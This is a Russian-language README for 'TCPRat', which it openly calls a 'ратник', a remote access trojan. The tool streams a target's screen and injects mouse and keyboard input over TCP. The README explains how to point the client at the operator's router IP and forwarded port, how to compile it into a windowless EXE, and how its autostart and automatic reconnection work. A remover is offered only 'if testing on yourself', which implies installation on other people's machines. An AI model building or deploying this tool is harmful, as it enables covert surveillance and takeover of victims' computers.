# TCPRat

## Описание

TCPRat — простой ратник для удалённого мониторинга экрана и управления мышью/клавиатурой по TCP.

## Файлы

- `server.py` — запускает сервер, принимает подключение клиента и показывает поток экрана
- `client.py` — отправляет скриншоты на сервер со скорость 60 кадров в секунду и выполняет команды управления
- `remover.py` — утилита для очистки автозапуска и удалённых данных (Если проверяете на себе)
- `.env` — файл конфигурации, где задаются IP и порт сервера 

## Требования

- Python 3.11 или новее
- Установите зависимости из `requirements.txt`:

```bash
python -m pip install -r requirements.txt
```

## Компиляция с PyInstaller

Для создания исполняемого файла используйте PyInstaller:

```bash
python -m pyinstaller --onefile server.py
python -m pyinstaller --onefile client.py
```

Если нужен GUI-сервер без консоли, добавьте флаг `--noconsole`:

```bash
python -m pyinstaller --onefile --noconsole server.py
```

Готовые файлы появятся в папке `dist`.

## Настройка

В файле `.env` задаются основные параметры для сервера и клиента.

```text
HOST=0.0.0.0 (Оставьте так)
PORT= порт открытый на вашем роутере
SERVER_IP= айпи вашего роутера (IpV4 можно узнать через команду ipconfig в cmd)
```

- `HOST` — IP, на котором слушает сервер. Обычно `0.0.0.0`.
- `PORT` — порт для сервера и клиента.
- `SERVER_IP` — IP сервера, куда подключается клиент.

### Что редактировать

- Для сервера: измените `HOST` и `PORT` в `.env`.
- Для клиента: измените `SERVER_IP` и `PORT` в `.env`.

Если `.env` отсутствует, клиент и сервер используют значения по умолчанию, но лучше всегда задавать их явно.

## Запуск

### Компиляция проекта в EXE формат

```bash
pyinstaller --name=ClientApp --onefile --windowed client.py   
```
### Сервер

```bash
python server.py
```

### Клиент

```bash
python client.py
```

## Поведение

- Клиент автоматически пытается подключиться, даже если сервер ещё не запущен.
- Если сервер перезапускается, клиент попытается восстановить соединение.
- Конфигурация берётся из `.env`.
